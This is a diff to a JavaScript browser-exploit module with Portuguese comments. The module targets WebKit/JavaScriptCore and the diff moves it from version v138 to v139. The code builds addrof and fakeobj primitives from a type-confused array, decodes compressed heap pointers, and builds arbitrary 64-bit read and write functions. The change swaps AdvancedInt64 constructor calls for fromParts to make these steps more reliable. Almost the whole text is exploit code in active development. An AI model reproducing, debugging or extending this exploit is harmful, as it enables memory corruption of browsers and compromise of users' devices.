@@ -1,12 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v138 - R98 Reforço de DecodeCompressedPointer e Depuração de AdvancedInt64)
+// js/script3/testArrayBufferVictimCrash.mjs (v139 - R99 Usar AdvancedInt64.fromParts para Contornar Construtor Problemático)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Adiciona logs detalhados dentro do construtor de AdvancedInt64 para depurar
-//   exatamente o que está sendo passado quando o TypeError ocorre.
-// - Reverte a lógica de 'decodeCompressedPointer' para usar 'new AdvancedInt64(number, number)'
-//   para o offset, com a esperança de que a robustez de doubleToInt64 ajude.
-// - Remove a construção da primitiva de L/E estável se o endereço decodificado estiver fora do OOB.
-//   Em vez disso, a Fase 5 passa diretamente para o vazamento da base WebKit com a primitiva OOB direta.
+// - Substitui todas as chamadas a 'new AdvancedInt64(low, high)' por 'AdvancedInt64.fromParts(low, high)'
+//   para contornar o aparente bug do JIT no construtor padrão.
+// - Isso deve estabilizar a manipulação de endereços e permitir que a decodificação
+//   de ponteiro e a primitiva de L/E funcionem.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -21,7 +19,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v138_R98_DebugAdvancedInt64";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v139_R99_FixAdvInt64Constructor";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -37,7 +35,6 @@ function doubleToInt64(double) {
     const buf = new ArrayBuffer(8);
     (new Float64Array(buf))[0] = double;
     const u32 = new Uint32Array(buf);
-    // Validar que os valores são inteiros válidos antes de criar AdvancedInt64
     const low = u32[0];
     const high = u32[1];
 
@@ -46,7 +43,7 @@ function doubleToInt64(double) {
         logS3(`ALERTA: doubleToInt64 recebeu double (${double}) que resultou em low: ${toHex(low)}, high: ${toHex(high)}. Retornando AdvancedInt64.Zero.`, "warn");
         return AdvancedInt64.Zero; 
     }
-    return new AdvancedInt64(low, high);
+    return AdvancedInt64.fromParts(low, high); // Usar fromParts
 }
 
 // =======================================================================================
@@ -57,9 +54,8 @@ function decodeCompressedPointer(leakedAddr) {
     
     const compressed_offset_32bit = leakedAddr.low(); 
     
-    // Reverte para a lógica original que falhou, mas agora com logs mais robustos no construtor de AdvancedInt64.
-    // O objetivo é que o log detalhe o problema se persistir.
-    const offset_as_int64 = new AdvancedInt64(compressed_offset_32bit, 0); 
+    // CORREÇÃO: Usar AdvancedInt64.fromParts para criar o offset
+    const offset_as_int64 = AdvancedInt64.fromParts(compressed_offset_32bit, 0); 
     
     const decoded_ptr = assumed_heap_base_for_decompression.add(offset_as_int64);
     
@@ -76,7 +72,7 @@ function decodeCompressedPointer(leakedAddr) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Depuração de AdvancedInt64 ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Fix para Construtor AdvancedInt64 ---`, "test");
 
     let final_result = {
         success: false,
@@ -108,7 +104,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             
             addrof_func = (obj) => {
                 victim_array[0] = obj;
-                // addrof_func vai retornar o ponteiro comprimido/taggeado
                 return doubleToInt64(confused_array[0]);
             };
             fakeobj_func = (addr) => { 
@@ -165,7 +160,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`(Verificação Fase 4) Endereço decodificado válido. Prosseguindo com teste L/E.`, "good");
 
         const prop_a_addr_phase4 = test_obj_addr_phase4_decoded.add(0x10); 
-        const value_to_write_phase4 = new AdvancedInt64(0x12345678, 0xABCDEF01);
+        const value_to_write_phase4 = AdvancedInt64.fromParts(0x12345678, 0xABCDEF01); // Usar fromParts
+        //logS3(`DEBUG: value_to_write_phase4: ${value_to_write_phase4.toString(true)}`, "debug");
 
         logS3(`(Verificação Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endereço DECODIFICADO ${prop_a_addr_phase4.toString(true)}...`, "info");
         arb_write_phase4(prop_a_addr_phase4, value_to_write_phase4); 
@@ -216,28 +212,21 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // Para corromper o backing store do arb_rw_array, precisamos que arb_rw_array_ab_view_addr_decoded
         // caia dentro da janela do oob_array_buffer_real. Isso não é garantido pelo ASLR.
-        
         // A primitiva oob_write_absolute e oob_read_absolute operam APENAS em OFFSETS RELATIVOS
-        // ao início do oob_array_buffer_real. Elas NÃO PODEM escrever em endereços ABSOLUTOS
-        // (como arb_rw_array_ab_view_addr_decoded, que está fora do oob_array_buffer_real).
-
-        // Portanto, a estratégia de corrupção do backing store ASSIM (OOB no próprio ArrayBuffer)
-        // é inviável se o alvo está fora do seu ArrayBuffer OOB.
-
-        // Vamos assumir que a `fakeobj_func` (com o `confused_array` e `victim_array` da Fase 4)
-        // pode ser usada diretamente como uma primitiva de Leitura/Escrita arbitrária de 64 bits,
-        // aceitando o endereço DECODIFICADO.
+        // ao início do oob_array_buffer_real.
+        // Portanto, vamos usar a `fakeobj_func` (com `confused_array` e `victim_array` da Fase 4)
+        // para criar a primitiva de L/E arbitrária final.
 
         arb_read_stable = (address, size_bytes) => {
             const temp_leaker = { obj_prop: null, val_prop: 0 }; 
-            temp_leaker.obj_prop = fakeobj_func(address); // fakeobj_func agora precisa aceitar o 'address' bruto (já decodificado)
+            temp_leaker.obj_prop = fakeobj_func(address); // fakeobj_func agora aceita o 'address' bruto (já decodificado)
             const result_64 = doubleToInt64(temp_leaker.val_prop);
             return (size_bytes === 4) ? result_64.low() : result_64;
         };
 
         arb_write_stable = (address, value, size_bytes) => {
             const temp_leaker = { obj_prop: null, val_prop: 0 }; 
-            temp_leaker.obj_prop = fakeobj_func(address); // fakeobj_func agora precisa aceitar o 'address' bruto
+            temp_leaker.obj_prop = fakeobj_func(address); // fakeobj_func agora aceita o 'address' bruto
             if (size_bytes === 4) {
                 temp_leaker.val_prop = Number(value) & 0xFFFFFFFF; 
             } else {
